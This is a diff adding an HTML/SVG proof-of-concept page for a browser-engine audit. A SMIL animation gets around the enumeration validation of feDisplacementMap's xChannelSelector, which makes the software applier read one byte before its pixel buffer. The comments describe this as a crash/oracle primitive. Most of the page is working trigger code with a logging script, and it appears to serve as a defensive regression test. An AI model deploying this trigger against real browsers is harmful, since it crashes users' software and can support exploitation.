@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>fedisplacement-selector: SMIL bypasses enum validation, applier indexes -1</title>
+<!--
+  Audit items #2 / #3 / #4 (docs/V19-FIX-DELTA.md).  #3/#4 are the bypass: in
+  19.0.0 SVGFEDisplacementMapElement::parseAttribute() rejects a bad
+  xChannelSelector ("if (propertyValue > 0)"), but
+  SVGAnimationEnumerationFunction::setFromAndToValues() in
+  svg/properties/SVGAnimationDiscreteFunctionImpl.h stores whatever
+  SVGPropertyTraits<ChannelSelectorType>::fromString() returns, and fromString()
+  maps anything that is not R/G/B/A to CHANNEL_UNKNOWN (0).  A SMIL animation is
+  therefore a validated-attribute bypass.
+
+  #2 is the consumer: FEDisplacementMapSoftwareApplier::xChannelIndex() is
+  "xChannelSelector() - 1", with no range check, so CHANNEL_UNKNOWN gives -1 and
+
+      displacementPixelBuffer->item(destinationIndex + displacementChannelX)
+
+  reads one byte *before* the displacement pixel buffer on the very first pixel
+  (destinationIndex == 0).  Both guards are WKC-only (#if PLATFORM(WKC)) in
+  23.0.1, so 19.0.0 has neither.
+
+  What it is and is not: PixelBuffer::item() takes a size_t, so index -1 becomes
+  SIZE_MAX; the read is always exactly one byte below the allocation, and its
+  value only ever feeds a bounds-checked srcX/srcY, so there is no data channel.
+  It is a crash/oracle primitive, not a leak or a write.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256">
+  <defs>
+    <filter id="f" filterUnits="userSpaceOnUse" x="0" y="0" width="256" height="256">
+      <feDisplacementMap id="d" in="SourceGraphic" in2="SourceGraphic"
+                         xChannelSelector="R" yChannelSelector="G" scale="8"/>
+    </filter>
+  </defs>
+  <rect id="r" x="0" y="0" width="256" height="256" fill="#2f6f2f" filter="url(#f)"/>
+  <!-- SMIL installs CHANNEL_UNKNOWN: fromString("foo") == 0, and the enumeration
+       animator never validates from/to the way parseAttribute() does. -->
+  <animate href="#d" attributeName="xChannelSelector"
+           from="R" to="foo" begin="0.25s" dur="0.4s" fill="freeze"/>
+</svg>
+<script>
+function log(m) {
+  document.title = m;
+  if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.log) {
+    try { window.webkit.messageHandlers.log.postMessage(m); } catch (e) {}
+  }
+  try { console.log(m); } catch (e) {}
+}
+
+let t0 = performance.now();
+let sawInvalid = false;
+
+function tick() {
+  let t = ((performance.now() - t0) / 1000).toFixed(2);
+  let sel;
+  try {
+    sel = "animVal=" + d.xChannelSelector.animVal + " baseVal=" + d.xChannelSelector.baseVal;
+  } catch (e) {
+    sel = "read failed: " + e;
+  }
+  let v = d.xChannelSelector.animVal;
+  if (v === 0) {
+    sawInvalid = true;
+    log("t=" + t + "s CHANNEL_UNKNOWN reached the filter primitive (" + sel + ")");
+  } else if (!sawInvalid) {
+    log("t=" + t + "s still valid (" + sel + ")");
+  }
+  // Keep painting the filtered rect every frame; the applier runs on each paint.
+  r.setAttribute("fill", (Math.floor(performance.now() / 50) % 2) ? "#2f6f2f" : "#2f6f30");
+  requestAnimationFrame(tick);
+}
+
+requestAnimationFrame(tick);
+setTimeout(function () { log("page finished (10 s) without the applier trapping"); }, 10000);
+</script>
